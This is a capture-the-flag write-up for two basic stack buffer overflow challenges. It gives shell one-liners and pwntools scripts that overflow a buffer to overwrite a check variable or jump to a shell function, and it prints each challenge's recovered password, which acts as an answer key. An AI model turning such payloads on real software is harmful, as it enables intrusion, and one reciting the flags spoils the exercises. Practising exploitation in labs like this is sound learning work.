# ***STACK BUFFER OVERFLOW BASIC 1***

From the given the challenge we give the buffer value as 40 and the check variable have to changed to ```deadbeef```.

We have to give ``deadbeef`` in reverse order since the stack reads them in the reverse order.

```cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13``` 

```
from pwn import *
io = process("./ch13")
payload = b"A"*40
payload += p64(0xdeadbeef)
io.sendline(payload)
io.interactive()
```

For both the exploits we get the shell

Then do ``ls -al``.

And ``cat .passwd``

We get ``1w4ntm0r3pr0np1s``

# ***STACK BUFFER OVERFLOW BASIC 2***

From the given the challenge we give the buffer value as 128 and here if we need to call the shell function.

Then we get the interactive shell


```cat <(python -c "print 'A' * 128 + '\x16\x85\x04\x08'") - | ./ch15```

```
from pwn import *
io = process("./ch15")
payload = b"A"*128
payload += p64(0x08048516)
io.sendline(payload)
io.interactive()
```
For both the exploits we get the shell

Then do ``ls -al``.

And ``cat .passwd``

We get ```B33r1sSoG0oD4y0urBr4iN```



